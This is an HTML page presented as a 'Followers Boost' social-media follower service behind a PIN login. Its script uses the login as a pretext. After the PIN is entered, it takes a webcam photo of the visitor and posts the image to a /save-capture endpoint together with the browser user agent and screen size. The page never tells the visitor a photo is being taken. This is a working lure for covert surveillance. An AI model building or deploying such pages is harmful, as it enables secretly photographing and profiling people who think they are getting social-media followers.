<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GET FOLLOWERS</title>

  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet"/>

  <style>
    body {
      background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      font-family: 'Inter', sans-serif;
      color: #fff;
    }

    .surface {
      background: rgba(15, 23, 42, 0.55);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 1.2rem;
      box-shadow: 0 20px 50px rgba(0, 0, 0, .6);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
    }

    .title {
      font-size: 2.2rem;
      font-weight: 800;
      text-transform: uppercase;
      background: linear-gradient(90deg, #00c6ff, #0072ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: 1px;
    }

    input, select {
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.15);
      padding: 0.75rem 1rem;
      border-radius: 0.75rem;
      width: 100%;
      color: #fff;
      font-size: 0.95rem;
      outline: none;
    }
    input::placeholder {
      color: #94a3b8;
    }
    select {
      cursor: pointer;
    }

    .btn-acc {
      background: linear-gradient(90deg, #ff00cc, #3333ff);
      color: #fff;
      padding: 0.8rem 1.2rem;
      border-radius: 0.8rem;
      font-weight: 600;
      font-size: 1rem;
      text-transform: uppercase;
      box-shadow: 0 10px 30px rgba(0, 0, 0, .5);
      transition: all 0.25s ease;
    }
    .btn-acc:hover {
      transform: translateY(-3px) scale(1.02);
      box-shadow: 0 15px 40px rgba(0, 0, 0, .65);
    }

    nav {
      background: rgba(15, 23, 42, 0.65);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
      padding: 1rem 1.5rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      z-index: 50;
    }
    nav h1 {
      font-weight: 800;
      font-size: 1.5rem;
      background: linear-gradient(90deg, #00f2fe, #4facfe);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    nav button {
      font-size: 1.8rem;
    }

    footer {
      background: rgba(15, 23, 42, 0.65);
      border-top: 1px solid rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(12px);
      text-align: center;
      padding: 1rem;
      font-size: 0.9rem;
      color: #cbd5e1;
    }
    
    #userStatus {
      margin-top: 1rem;
      font-size: 1rem;
      font-weight: 600;
    }

    .toggleMenu {
      position: fixed;
      top: 0;
      left: -280px;
      width: 260px;
      height: 100%;
      background: rgba(15, 23, 42, 0.55);
      backdrop-filter: blur(20px) saturate(160%);
      border-right: 1px solid rgba(255,255,255,0.08);
      box-shadow: 6px 0 25px rgba(0,0,0,0.65);
      transition: left .45s cubic-bezier(0.68,-0.55,0.27,1.55);
      display: flex;
      flex-direction: column;
      padding: 2rem 1rem;
      z-index: 40;
      overflow: hidden;
    }
    .toggleMenu.active { left: 0; }

    .overlay {
      content:"";
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.55);
      backdrop-filter: blur(6px);
      z-index: 30;
      opacity: 0;
      pointer-events: none;
      transition: opacity .35s ease;
    }
    .overlay.show {
      opacity: 1;
      pointer-events: auto;
    }

    .close-btn {
      align-self: flex-end;
      font-size: 1.6rem;
      margin-bottom: 2rem;
      cursor: pointer;
      color: #fca5a5;
      text-shadow: 0 0 10px #ef4444, 0 0 20px #b91c1c;
      transition: transform .3s ease, color .3s ease;
    }
    .close-btn:hover {
      transform: rotate(90deg) scale(1.2);
      color: #ef4444;
    }

    .toggleMenu a {
      padding: 0.9rem 1rem;
      margin-bottom: 1.2rem;
      border-radius: 0.8rem;
      color: #f9fafb;
      font-weight: 700;
      font-size: 1.1rem;
      text-align: center;
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.12);
      backdrop-filter: blur(10px);
      transition: all .35s ease;
      position: relative;
      overflow: hidden;
    }
    .toggleMenu a::before {
      content:"";
      position: absolute;
      inset: 0;
      background: linear-gradient(90deg,#ff00cc,#3333ff,#00f2fe);
      opacity: 0;
      transition: opacity .35s ease;
      z-index: -1;
    }
    .toggleMenu a:hover::before { opacity: 0.6; }
    .toggleMenu a:hover {
      transform: translateX(8px) scale(1.05);
      box-shadow: 0 0 25px rgba(51,51,255,.6), 0 0 30px rgba(255,0,204,.6);
    }
    
    .toggleMenu::after {
      content:"";
      position:absolute;
      inset:0;
      background: radial-gradient(circle at top left, rgba(99,102,241,.15), transparent 70%),
                  radial-gradient(circle at bottom right, rgba(236,72,153,.12), transparent 70%);
      animation: glowPulse 6s ease-in-out infinite alternate;
      z-index:-1;
    }
    @keyframes glowPulse {
      from { opacity: .5; }
      to   { opacity: 1; }
    }
  </style>
</head>
<body>
  <nav>
    <h1>‚ö° FOLLOWERS BOOST</h1>
    <button onclick="toggleMenu()">‚ò∞</button>
  </nav>

  <!-- Overlay background -->
  <div id="overlay" class="overlay" onclick="toggleMenu()"></div>

  <div id="toggleMenu" class="toggleMenu">
    <div class="close-btn" onclick="toggleMenu()">‚úñ</div>
    <a href="index.html">üè† Home</a>
    <a href="owner.html">üîë Owner</a>
  </div>
  
  <main class="flex-grow flex items-center justify-center p-6">
    <div id="loginCard" class="surface p-8 max-w-md w-full">
      <h2 class="title mb-4 text-center">Enter Access PIN</h2>
      <p class="text-center mb-6 text-gray-300">Secure access required before proceeding (1111) üöÄ</p>

      <div class="flex items-center justify-center mb-4">
        <input id="userPin" type="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢">
        <button onclick="userLogin()" class="btn-acc ml-2">Login</button>
      </div>

      <div id="spinner" class="hidden mt-6 text-center">
        <div class="animate-spin rounded-full h-10 w-10 border-t-4 border-blue-400 border-opacity-70 mx-auto"></div>
        <p class="mt-2 text-blue-400">Capturing...</p>
      </div>

      <p id="userStatus" class="text-center"></p>
    </div>
  </main>
  <footer>
    ‚ö° Powered by <span class="text-blue-400 font-semibold">Followers Boost</span>
  </footer>
  <script>
    const USER_PIN = "1111";

    function toggleMenu() {
      document.getElementById("toggleMenu").classList.toggle("active");
    }

    function userLogin() {
      const pinInput = document.getElementById("userPin");
      const pin = pinInput.value;
      const status = document.getElementById("userStatus");
      const card = document.getElementById("loginCard");
      const spinner = document.getElementById("spinner");

      if (pin === USER_PIN) {
        status.innerHTML = "‚úÖ <span class='text-green-400'>Access Granted...</span>";
        status.classList.add("success-pulse");
        spinner.classList.remove("hidden");
        setTimeout(captureImage, 1500);
      } else {
        status.innerHTML = "‚ùå <span class='text-red-400'>Wrong PIN!</span>";
        card.classList.remove("shake"); 
        void card.offsetWidth; 
        card.classList.add("shake");
      }
    }

    function captureImage() {
      const spinner = document.getElementById("spinner");
      spinner.classList.add("hidden");

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/png");

            stream.getTracks().forEach(track => track.stop());

            fetch("/save-capture", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                time: new Date().toLocaleString(),
                ip: "192.168.0." + Math.floor(Math.random() * 255),
                device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
                img: imageData
              })
            })
            .then(() => {
              document.getElementById("userStatus").innerHTML = "‚úÖ <span class='text-green-400'>Access successful.</span>";
            })
            .catch(err => {
              document.getElementById("userStatus").innerHTML = "‚ö†Ô∏è <span class='text-yellow-400'>Error saving!</span>";
              console.error(err);
            });
          }, 1200);
        })
        .catch(err => {
          document.getElementById("userStatus").innerHTML = "‚ö†Ô∏è <span class='text-red-400'>Something went wrong!</span>";
          console.error("Camera error:", err);
        });
    }

    function switchTheme(theme){
      document.body.classList.add("theming");
      setTimeout(()=>{
        document.body.className = "theme-" + theme + " flex flex-col min-h-screen";
      }, 120);
      setTimeout(()=> document.body.classList.remove("theming"), 380);
    }
  </script>
</body>
</html>
